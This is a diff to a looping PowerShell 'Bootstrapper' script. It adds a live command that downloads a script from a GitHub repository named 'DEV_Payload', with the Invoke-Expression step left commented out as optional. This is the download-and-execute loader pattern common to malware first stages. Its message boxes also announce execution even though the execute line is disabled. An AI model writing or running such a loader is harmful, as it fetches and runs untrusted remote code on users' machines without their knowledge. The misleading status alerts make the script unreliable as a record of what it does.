@@ -9,22 +9,20 @@ while ($true) {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("User-Agent", "Bootstrapper")
 
-        # URL of your main watcher script
-        # URL $scriptUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/PowerShell/UniversalPowerShell_Dynamic_15E1362D_E98B_4386_9CA9_DD52D7ECCEE7.ps1"
-        $scriptUrl = ""
+        # Define your URL here
+        $url = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1"
 
-        # Download code
-         # $code = $wc.DownloadString($scriptUrl)
+        # Actually download
+        $scriptContent = $wc.DownloadString($url)
+
+        # OPTIONAL: Execute it
+        # iex $scriptContent
 
         # Show alert: Download complete
         [System.Windows.MessageBox]::Show("Bootstrapper: Download complete. Executing...")
 
-        # Execute code
-        # Invoke-Expression $code
-
         # Show alert: Execution finished
         [System.Windows.MessageBox]::Show("Bootstrapper: Execution complete. Waiting 5 seconds...")
-
     }
     catch {
         # Show alert: Error
